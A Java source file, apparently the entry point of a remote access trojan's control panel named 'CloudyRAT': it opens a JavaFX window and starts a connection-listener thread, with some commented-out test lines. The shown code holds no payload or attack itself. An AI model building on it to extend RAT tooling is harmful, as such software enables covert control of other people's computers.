package com.panel;

import com.server.ConnectListener;
import com.server.ServerListener;
import com.server.ServerListenerThreadMethods;
import com.server.ServerMethods;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class Main extends Application {

    @Override
    public void start(Stage primaryStage) throws Exception{
        Parent root = FXMLLoader.load(getClass().getResource("sample.fxml"));
        primaryStage.setTitle("CloudyRAT");
        primaryStage.setScene(new Scene(root, 900, 800));
        primaryStage.show();

        Thread connectionListener = new Thread(new ConnectListener());
        connectionListener.start();

//        Thread serverListener;
//        ServerMethods serverMethods = new ServerMethods();
//        String testString = "updateData()";
//        ArrayList<String> testList = new <String>ArrayList<String>();
//        testList.add("value1");
//        Object submittedObject = testList;
    }


    public static void main(String[] args) {
        launch(args);
    }
}
